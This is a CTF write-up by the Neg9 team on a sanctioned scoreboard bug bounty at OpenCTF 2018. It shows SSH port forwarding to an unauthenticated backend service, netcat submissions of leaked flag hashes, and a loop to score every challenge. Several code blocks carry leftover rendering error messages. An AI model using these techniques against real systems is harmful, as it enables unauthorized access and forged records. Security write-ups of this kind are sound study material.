---
title: "OpenCTF 2018 - Scoreboard Bug Bounty Writeup"
slug: "openctf-2018-scoreboard-bug-bounty-writeup"
date: "2018-08-15 10:06:19.140572"
author_name: "craSH"
author_email: "crash@neg9.org"
draft: false
toc: false
images:
---

Scoreboard Bug Bounty - 1337

- DEFCON 26 @Open_CTF

- 2018-08-11

- Solved by Neg9 [craSH, tecknicaltom, reidb]

{language=python}
~~~~~~~~
SCOREBOARD BUG BOUNTY IS OPEN. COME AT US BR0!!! V& OUT!!! https://scoreboard.openctf.com/scoreboardbugbounty-dd9dd662cb9895a2353f6c463120b9eb7fed2bfb
~~~~~~~~

Scoreboard Server: scoreboard.openctf.com

The Scoreboard server is running an SSH server, which is the primary method teams use to interact with it. Each team has a shell account, and the users' shell is set to be `interact.py` from the above source archive.

There were several issues with the scoreboard system configuration, code, and how the organizers released the code, which when combined, resulted in the ability of a team to score all possible challenges for themselves without leaving any trace of doing so, and by not using the intended `interact.py` method of scoring.

- Issue 1: sshd is configured to allow port forwarding/dynamic proxying.

- Issue 2: `collect_keys.py` accepts connections without authentication, and it does not log connections made to it to syslog like `interact.py` does.

- Issue 3: The included SQLite database (`central.db`) included all (SHA512) hashes of the flags. This hash value is what the backend `collect_keys.py` takes in addition to team name and challenge ID to register a scoring event.

As such, you can directly connect to the backend and submit a known hash for a question to a team.

One could connect to the scoreboard as such to open a socket on the players local machine on port 41337 which is a tunnel to the backend service `collect_keys.py` running on the scoreboard:

"System Message: ERROR/3 (<string>:, line 26)"
Error in "code" directive:
maximum 1 argument(s) allowed, 3 supplied.

{language=python}
~~~~~~~~
.. code:: ssh -L41337:localhost:41337 neg9@scoreboard.openctf.com

~~~~~~~~

And in another terminal, one could then connect to the `collect_keys.py` service as follows:

"System Message: ERROR/3 (<string>:, line 30)"
Error in "code" directive:
maximum 1 argument(s) allowed, 3 supplied.

{language=python}
~~~~~~~~
.. code:: nc localhost 41337

~~~~~~~~

This would yield the service authentication string (lol) and wait to be written to:

"System Message: ERROR/3 (<string>:, line 34)"
Error in "code" directive:
maximum 1 argument(s) allowed, 2 supplied.

{language=python}
~~~~~~~~
.. code:: lol goatse

~~~~~~~~

At this point, the service expects a scoring event message in the following format:

"System Message: ERROR/3 (<string>:, line 38)"
Content block expected for the "code" directive; none found.

{language=python}
~~~~~~~~
.. code:: <Team_Name>,<Question_ID>,<Flag_SHA512_Hex>

~~~~~~~~

For example - here is the string to submit to score question ID 15 (this scoreboard bug bounty challenge) for team neg9:

"System Message: ERROR/3 (<string>:, line 42)"
Content block expected for the "code" directive; none found.

{language=python}
~~~~~~~~
.. code:: neg9,15,40a2475624d82487a9ded98fc661fd9dde15e02973a5280a8b4b76fc81e41a123190604848fa1d23b181a17b3303e184588211b81bef71e58ef8e26b7f300eb6

~~~~~~~~

As we have all hashes in the database provided, we can script up scoring for all questions. Here is the database schema:

{language=python}
~~~~~~~~
CREATE TABLE questions(challenge_name text, tags text, point_value integer, answer_hash text, question text, solved integer, open integer, qualification);
CREATE TABLE team_score(team_name text, challenge_name text, point_value integer, answer_hash text, time_solved text, first integer, PRIMARY KEY(team_name, challenge_name, point_value, answer_hash) ON CONFLICT IGNORE);
~~~~~~~~

And for demonstration, here is the row for this challenge:

{language=python}
~~~~~~~~
sqlite> select * from questions where challenge_name like '%bug%';
Scoreboard Bug Bounty|Kajer scoreboard|1337|40a2475624d82487a9ded98fc661fd9dde15e02973a5280a8b4b76fc81e41a123190604848fa1d23b181a17b3303e184588211b81bef71e58ef8e26b7f300eb6|Find an 0-day in our scoreboard. Source is here: https://pastebin.com/nVR8gEih
~~~~~~~~

We expeditiously grabbed all of the hashes from the dump and put them in a file to work with.

The following nested for loop would submit all hashes for neg9 (we extracted just the hash values and placed them in hashes.txt):

"System Message: ERROR/3 (<string>:, line 63)"
Error in "code" directive:
maximum 1 argument(s) allowed, 20 supplied.

{language=python}
~~~~~~~~
.. code:: for hash in $(cat hashes.txt); do for id in {1..100}; do echo "neg9,${id},${hash}" | nc localhost 41337; done ; done

~~~~~~~~

We made a POC of this with the question ID 15, for the scoreboard bug bounty, and we were successfully awarded **1337** points. The organizers quickly disabled SSH port forwarding/tunneling at this point, and we were not able to score for the other flags in this manner. Good work :)
